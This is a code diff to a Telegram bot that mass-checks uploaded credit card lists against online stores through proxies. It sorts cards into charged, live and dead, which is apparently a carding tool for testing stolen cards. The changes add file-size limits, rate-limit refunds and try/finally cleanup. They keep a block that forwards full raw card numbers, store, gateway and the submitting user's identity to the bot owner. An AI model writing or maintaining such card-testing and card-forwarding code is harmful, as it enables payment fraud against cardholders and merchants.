@@ -123,6 +123,14 @@ async def receive_card_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
         return WAITING_FOR_FILE
 
+    # Limit to 5MB max
+    if doc.file_size and doc.file_size > 5 * 1024 * 1024:
+        await update.message.reply_text(
+            format_error("File is too large. Max 5MB allowed."),
+            parse_mode=ParseMode.HTML,
+        )
+        return WAITING_FOR_FILE
+
     # Download file
     try:
         file = await doc.get_file()
@@ -233,7 +241,12 @@ async def receive_card_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 async def cancel_mass_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     """Cancel mass check conversation."""
-    ctx.user_data.pop("mass_check_cards", None)
+    user = update.effective_user
+    cards = ctx.user_data.pop("mass_check_cards", None)
+    if cards:
+        rate_limiter.refund_hourly(user.id, len(cards))
+    # Always release the active-mass counter so the user isn't permanently locked
+    rate_limiter.cancel_mass(user.id)
     await update.message.reply_text("❌ Mass check cancelled.")
     return ConversationHandler.END
 
@@ -253,7 +266,10 @@ async def mass_check_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     data = query.data
 
     if data == CB_CANCEL:
-        ctx.user_data.pop("mass_check_cards", None)
+        cards = ctx.user_data.pop("mass_check_cards", None)
+        if cards:
+            rate_limiter.refund_hourly(user.id, len(cards))
+        rate_limiter.cancel_mass(user.id)
         await query.edit_message_text("❌ Mass check cancelled.")
         return
 
@@ -357,93 +373,95 @@ async def mass_check_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     ).fetchone()
     state_id = state_row["id"] if state_row else None
 
-    result = await mass_check(
-        cards=cards,
-        stores=stores,
-        workers=workers,
-        timeout=25,
-        progress_callback=progress_cb,
-        progress_interval=3.0,
-        proxy_provider=proxy_provider,
-        state_conn=conn,
-        state_id=state_id,
-        health_cache=health_cache,
-    )
-
-    # Send final summary
-    final_text = format_mass_check_complete(
-        price_range=range_label,
-        total=result.total,
-        duration=format_duration(result.duration),
-        charged=len(result.charged),
-        live=len(result.live),
-        dead=len(result.dead),
-    )
-    await ctx.bot.send_message(
-        chat_id=chat_id, text=final_text, parse_mode=ParseMode.HTML,
-    )
-
-    # Send charged cards list if any
-    if result.charged:
-        charged_text = format_charged_cards_list(result.charged)
-        await ctx.bot.send_message(
-            chat_id=chat_id, text=charged_text, parse_mode=ParseMode.HTML,
+    try:
+        result = await mass_check(
+            cards=cards,
+            stores=stores,
+            workers=workers,
+            timeout=25,
+            progress_callback=progress_cb,
+            progress_interval=3.0,
+            proxy_provider=proxy_provider,
+            state_conn=conn,
+            state_id=state_id,
+            health_cache=health_cache,
         )
 
-    # Send live cards list if any
-    if result.live:
-        live_text = format_live_cards_list(result.live)
+        # Send final summary
+        final_text = format_mass_check_complete(
+            price_range=range_label,
+            total=result.total,
+            duration=format_duration(result.duration),
+            charged=len(result.charged),
+            live=len(result.live),
+            dead=len(result.dead),
+        )
         await ctx.bot.send_message(
-            chat_id=chat_id, text=live_text, parse_mode=ParseMode.HTML,
+            chat_id=chat_id, text=final_text, parse_mode=ParseMode.HTML,
         )
 
-    # Update user stats (batched)
-    from core.database import batch_increment_stats
-    batch_increment_stats(conn, user.id,
-                          charged=len(result.charged),
-                          live=len(result.live),
-                          dead=len(result.dead))
+        # Send charged cards list if any
+        if result.charged:
+            charged_text = format_charged_cards_list(result.charged)
+            await ctx.bot.send_message(
+                chat_id=chat_id, text=charged_text, parse_mode=ParseMode.HTML,
+            )
 
-    # Log to history
-    log_check_history(
-        conn, user.id, "mass",
-        cards_total=result.total,
-        live=len(result.live),
-        dead=len(result.dead),
-        charged=len(result.charged),
-        price_range=range_label,
-        duration=result.duration,
-    )
+        # Send live cards list if any
+        if result.live:
+            live_text = format_live_cards_list(result.live)
+            await ctx.bot.send_message(
+                chat_id=chat_id, text=live_text, parse_mode=ParseMode.HTML,
+            )
 
-    # Clean up rate limiter
-    rate_limiter.end_mass(user.id)
+        # Update user stats (batched)
+        from core.database import batch_increment_stats
+        batch_increment_stats(conn, user.id,
+                              charged=len(result.charged),
+                              live=len(result.live),
+                              dead=len(result.dead))
 
-    # Log charged cards (batched)
-    if result.charged:
-        from core.database import batch_log_charged_cards
-        batch_log_charged_cards(conn, user.id, result.charged)
+        # Log to history
+        log_check_history(
+            conn, user.id, "mass",
+            cards_total=result.total,
+            live=len(result.live),
+            dead=len(result.dead),
+            charged=len(result.charged),
+            price_range=range_label,
+            duration=result.duration,
+        )
 
-        # Forward charged cards to owner
-        try:
-            owner_id = ctx.bot_data["config"]["bot"]["owner_id"]
-            for card, res in result.charged[:10]:  # Limit to 10 to avoid spam
-                await ctx.bot.send_message(
-                    chat_id=owner_id,
-                    text=(
-                        f"🤍 CHARGED (Mass) 🤍\n\n"
-                        f"💳 CC : {card.raw}\n"
-                        f"🛒 Gateway : {res.gateway}\n"
-                        f"📝 Response : {res.message}\n"
-                        f"💵 Price : ${res.price}\n"
-                        f"🏪 Store : {res.store}\n"
-                        f"👤 User : {user.id} ({user.username})\n\n"
-                        f"💳 BIN: {card.bin}\n"
-                        f"━━━━━━━━━━━━━━━━━━━━━━"
-                    ),
-                    parse_mode=ParseMode.HTML,
-                )
-        except Exception as e:
-            logger.warning("Failed to forward charged cards to owner: %s", e)
+        # Log charged cards (batched)
+        if result.charged:
+            from core.database import batch_log_charged_cards
+            batch_log_charged_cards(conn, user.id, result.charged)
+
+            # Forward charged cards to owner
+            try:
+                owner_id = ctx.bot_data["config"]["bot"]["owner_id"]
+                for card, res in result.charged[:10]:  # Limit to 10 to avoid spam
+                    await ctx.bot.send_message(
+                        chat_id=owner_id,
+                        text=(
+                            f"🤍 CHARGED (Mass) 🤍\n\n"
+                            f"💳 CC : {card.raw}\n"
+                            f"🛒 Gateway : {res.gateway}\n"
+                            f"📝 Response : {res.message}\n"
+                            f"💵 Price : ${res.price}\n"
+                            f"🏪 Store : {res.store}\n"
+                            f"👤 User : {user.id} ({user.username})\n\n"
+                            f"💳 BIN: {card.bin}\n"
+                            f"━━━━━━━━━━━━━━━━━━━━━━"
+                        ),
+                        parse_mode=ParseMode.HTML,
+                    )
+            except Exception as e:
+                logger.warning("Failed to forward charged cards to owner: %s", e)
+
+    finally:
+        # Clean up rate limiter
+        rate_limiter.end_mass(user.id)
 
     logger.info(
         "Mass check complete: user=%d total=%d charged=%d live=%d dead=%d duration=%.1fs",
